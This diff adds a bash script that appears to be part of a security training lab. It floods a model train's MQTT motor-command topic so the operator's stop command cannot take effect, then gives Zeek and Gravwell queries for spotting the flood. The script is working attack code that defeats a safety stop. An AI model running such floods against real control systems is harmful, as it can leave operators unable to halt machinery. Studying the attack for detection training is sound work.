@@ -1,0 +1,36 @@
+#!/usr/bin/env bash
+# Stage 3a — MQTT Throttle Flood (V7)
+# Drowns out the operator's stop button by flooding cmd/motor faster than
+# the web UI can publish cmd/stop.
+# Zeek visibility: mqtt.log — high PUBLISH rate from single source IP
+set -euo pipefail
+
+BROKER="${BROKER:-mosquitto}"
+TRAIN="${TRAIN:-t1}"
+DURATION="${DURATION:-10}"  # seconds
+
+echo "=== [mqtt-flood] Stage 3a: Throttle flood — operator stop is overwhelmed ==="
+echo ""
+echo "Flooding cmd/motor for ${DURATION}s. Open the train UI and hit STOP — it won't stick."
+echo "Zeek will see a burst of PUBLISH from this IP. Baseline is ~1/s; we send ~100/s."
+echo ""
+
+END=$(( $(date +%s) + DURATION ))
+COUNT=0
+while [ "$(date +%s)" -lt "$END" ]; do
+  mosquitto_pub -h "$BROKER" \
+    -t "choochoo/train/${TRAIN}/cmd/motor" \
+    -m '{"action":"motor","direction":"forward","power":99}' 2>/dev/null
+  COUNT=$(( COUNT + 1 ))
+done
+
+echo "Sent $COUNT messages in ${DURATION}s."
+echo ""
+
+echo "--- Stopping the train ---"
+mosquitto_pub -h "$BROKER" -t "choochoo/train/${TRAIN}/cmd/stop" -m '{}'
+echo ""
+
+echo "[mqtt-flood] Done. Check mqtt.log on the sensor — look for:"
+echo "  High PUBLISH rate (>10/s) from this IP on port 1883"
+echo "  Gravwell: tag=zeek json _path=='mqtt' | stats count by id.orig_h"
